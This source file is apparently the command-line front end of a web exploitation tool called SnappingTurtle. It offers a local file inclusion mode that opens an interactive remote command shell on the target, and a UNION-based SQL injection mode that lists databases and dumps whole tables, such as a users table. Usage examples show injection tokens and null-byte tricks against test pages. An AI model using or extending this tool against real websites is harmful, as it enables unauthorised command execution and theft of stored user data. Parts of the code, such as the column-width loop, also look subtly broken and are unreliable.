import('json');

class ShellCommand {
    Quit: 'quit',
};

shellLoop = @(shell) {
    while (true) {
        cmd = raw_input('st>');
        
        switch (cmd) {
            ShellCommand.Quit: {
                print('Exiting');
                quit();
            }
            default: cmd |> shell.run |> print;
        }
    }
};

listTables = @(tmpl) {
    probe = SqlUnionProbe(tmpl);
    di = probe.listSchemas();
    
    if (di == null)
    {
        print('[X] List tables failed');
        
        ret null;
    }
    
    keys = di.keys();
    print('[+] %s databases found\r\n' % (keys |> len));
    for (key in keys) {
        print('    ' + key);
        for (table in di[key])
            print('      ' + table);
        print('');
    }
};

printTable = @(columns, rows) {
    rows = [columns] + [columns @select(@(x) '')] + rows;
    
    colLens = range(0, len(rows))
        @select(@(x)
            sorted(rows[x], key = len, reverse = true)[0]
            |> len
            @+ 2);
            
    for (row in rows) {
        i = 0;
        maxLen = colLens[i];
        for (col in row) {
            pad = maxLen - len(col);
            sys.stdout.write(col + (' ' * (pad + 1)));
            i++;
        }
        sys.stdout.write('\r\n');
    }
};

print('SnappingTurtle Web Exploitation Tool 0.1.' + __BUILD__);
print('AutoSec Tools - http://autosectools.com/\r\n');

if (hasArgs) {
    shell = null;
    tmpl = HttpRequestTemplate(args.Url, args.Get, args.Post);
    
    switch (args.Mode) {
        ClassOption.Lfi: {
            print('[i] Exploiting local file inclusion');            
            shell = LfiShell(tmpl);
            
            if (!shell.create()) {
                print('[X] Failed to create shell, exiting');
                quit();
            }
        }
        
        ClassOption.Sqli: {
            print('[i] Exploiting SQL injection');
            
            switch (args.ModeOption) {
                SqliOption.List: {
                    print('[?] Listing databases and tables');
                    listTables(tmpl);
                }
                
                SqliOption.Table: {
                    p = args.ModeOption2.split('.');
                    schema = p[0];
                    table = p[1];
                    print("[?] Dumping table '{}' of database '{}'".format(table, schema));
                    probe = SqlUnionProbe(tmpl);
                    columns = probe.listColumns(schema, table);                    
                    rows = probe.dumpTable(table, columns = columns);
                    printTable(columns, rows);
                    quit();
                }
                    
                default: {
                    print('[X] Invalid SQL injection option');
                    quit();
                }
            }
            
            quit();
        }
        
        default: {
            print('[X] Invalid strategy: %s' % args.Mode);
            quit();
        }
    }

    shellLoop(shell);
} else {    
    print('python st.py [strategy] [url] [inputs]\r\n');
    print('# Strategies\r\n');
    print('  lfi                    Local file inclusion. Injection is performed using the $lfi token.');
    print('  sqli {options}         SQL injection. Injection is performed using the $sqli token.');
    print('        list             Dumps a list of databases and tables.');    
    print('        table {name}     Dumps a database table.');
    print('');
    print('# Url\r\n');
    print('  The url to exploit. Can be injected into using tokens.\r\n');
    print('# Inputs\r\n');
    print('  --g {GET name} {GET value}     GET data in key/value format.');
    print('  --p {POST name} {POST value}   POST data in key/value format.');
    print('  -g {GET data}                  GET data in Python map format.');
    print('  -p {POST data}                 POST data in Python map format.');
    print('');
    print('# Examples\r\n');
    print('  python st.py lfi http://localhost/lfiTest.php?theme=$lfi\r\n');
    print('  python st.py lfi http://localhost/lfiTest.php --g theme $lfi\r\n');
    print('  python st.py lfi http://localhost/lfiTest.php?theme=$lfi%00\r\n');
    print('  python st.py lfi http://localhost/postTest.php -p "{\'theme\':\'$lfi\'}"\r\n');
    print('  python st.py sqli list http://localhost/sqliTest.php --g email $sqli\r\n');
    print('  python st.py sqli table sqlitest.users http://localhost/sqliTest.php --g email $sqli\r\n');
}
